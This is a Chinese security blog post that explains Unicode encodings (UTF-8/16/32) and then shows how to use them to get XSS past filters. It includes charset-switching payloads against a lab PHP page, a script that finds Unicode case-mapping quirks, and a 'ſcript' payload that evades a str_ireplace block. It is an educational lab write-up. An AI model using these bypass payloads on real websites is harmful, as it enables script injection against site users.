---
title: unicode绕过xss
date: 2017-08-07 19:54:17
categories: Web安全
tags:
    - XSS
    - unicode
---

无意间看到一篇讲解unicode绕过xss的文章[Xssing Web With Unicodes](http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)，内容比较基础，记录下，顺便巩固下unicode的相关知识:)
<!-- more -->

## unicode基础知识

简单来说，unicode 是字符集，utf-8,utf-16,utf-32是编码规则。
[unicode 字符集: ttps://unicode-table.com/](https://unicode-table.com/)

### UTF-8 (1-4 byte)
utf-8是可变变长编码，将一个unicode码位编码成1-4字节。

```
U+ 0000 ~ U+ 007F: 0XXXXXXX
U+ 0080 ~ U+ 07FF: 110XXXXX 10XXXXXX
U+ 0800 ~ U+ FFFF: 1110XXXX 10XXXXXX 10XXXXXX
U+10000 ~ U+1FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX
```

Example :
* Character "A" => 0x41
* Character "ſ"  => 0xC4 0xBF
* Character "ಓ" => 0xE0 0xB2 0x93
* Character "𪨶" => 0xF0 0xAA 0xA8 0xB6

例如 “ſ”查unicode字符集为 `\u+017f`

```
0000 0001 0111 1111  <- unicode 二进制
110+00100 10+111111  <- utf-8 编码(二进制)，对应上面第二行
1100 0100 1011 1111  <- 0Xc4 0xbf
```

在线unicode转utf-8工具: [http://www.ltg.ed.ac.uk/~richard/utf-8.cgi?input=017f&mode=hex](http://www.ltg.ed.ac.uk/~richard/utf-8.cgi?input=017f&mode=hex)

### UTF-16 (2byte)

* UTF-16be (be- Big Endian) [Left to Right Byte Order ]

  Example :
  * Character "A" => 0x00 0x41

* UTF-16le (le- Little Endian) [Right to Left Byte Order]

  Example :
  * Character "A" => 0x41 0x00

### UTF-32 (4 byte)

* UTF-32be (be- Big Endian) [Left to Right Byte Order]

  Example :
  * Character "A" => 0x00 0x00 0x00 0x41

* UTF-32le (le- Little Endian) [Right to Left Byte Order]

  Example :
  * Character "A" => 0x41 0x00 0x00 0x00



## unicode绕过

### 简单编码绕过 :

[http://rakeshmane.com/lab/unicode/xss.php?x=payload&charset=utf-8](http://rakeshmane.com/lab/unicode/xss.php?x=payload&charset=utf-8)

```php
<?php
header('X-XSS-Protection: 0');
header('Content-Type: text/html; charset='.$_GET['charset']);
highlight_string(file_get_contents(__FILE__, true));
$x=$_GET['x'];
$x=preg_replace('/<\w+/', '', $x);
echo $x;
?>
```

这个比较简单，设置字符集为 utf-16 或 utf-32可以绕过`preg_replace`检测

* 设置编码为utf-16大端模式:

  `x=%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00&charset=utf-16be`

* 设置编码为utf-32

  `x=%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E&charset=UTF-32`

  看paylaod可以发现 最前面多了一个 %00，UTF-32是4字节编码，"<"编码为"%00%00%00%3C", 前面多加的一个 %00, 是为了匹配服务器返回的页面内容为4的整数倍，这样浏览器通过utf-32编码页面内容才能正确渲染提供的payload,触发xss,实际情况需要添加多少个 %00 来满足4的整数倍，视具体情况而定。

  {% asset_img 001.png %}

当没有指定编码模式(大端，小端)时，默认情况下UTF-32为大端模式，UTF-16为小端模式。

### 滥用unicode映射

有些应用为了更好的兼容性，将unicode字符映射为大写或小写英文字母，作则给了一段nodejs代码去获取这些映射关系。

```javascript
highNumber=65000;
for(i=0;i<highNumber;i++){
	x=""
	y=""
	if("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"/?><';:.,|\\+=-_*&^%$#@!~`".includes(String.fromCharCode(i).toLowerCase()))
		x=String.fromCharCode(i).toLowerCase()
	if("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"/?><';:.,|\\+=-_*&^%$#@!~`".includes(String.fromCharCode(i).toUpperCase()))
		y=String.fromCharCode(i).toUpperCase()
	if((x!=""||y!="")&&!("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"/?><';:.,|\\+=-_*&^%$#@!~`".includes(String.fromCharCode(i))))
		console.log(" "+i+" Original : "+String.fromCharCode(i)+" [\\u"+(i).toString(16)+"] LowerCase : "+x+" UpperCase : "+y)
}
```

得到如下结果:

```
 305 Original : ı [\u131] LowerCase :  UpperCase : I
 383 Original : ſ [\u17f] LowerCase :  UpperCase : S
 8490 Original : K [\u212a] LowerCase : k UpperCase :
 64261 Original : ﬅ [\ufb05] LowerCase :  UpperCase : ST
 64262 Original : ﬆ [\ufb06] LowerCase :  UpperCase : ST
```

* demo

  ```Php
  <?php
  header('Content-Type: text/html; charset=UTF-8');
  header('X-XSS-Protection: 0');
  ?>
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self';">

  <?php
  highlight_string(file_get_contents(__FILE__, true));
  $x=$_GET['x'];
  $x=str_ireplace('$','',$x); // Use it to bypass WAF,I know it's annoying but I can't disable it :P
  $x=str_ireplace('<script','BLOCKED',$x);
  $x = mb_convert_case($x, MB_CASE_UPPER);
  echo $x;
  ?>
  ```

  源码中使用`mb_convert_case`去转换字符，默认用utf-8编码，从上面的unicode映射可知`ſ [\u17f]`映射为大写字母`S`可以，以此来绕过`str_ireplace`的检测, `ſ [\u17f]`utf-8编码为0xc40xbf

  Paylaod: `x=<%C5%BFcript/src=./1></script>`

  ​
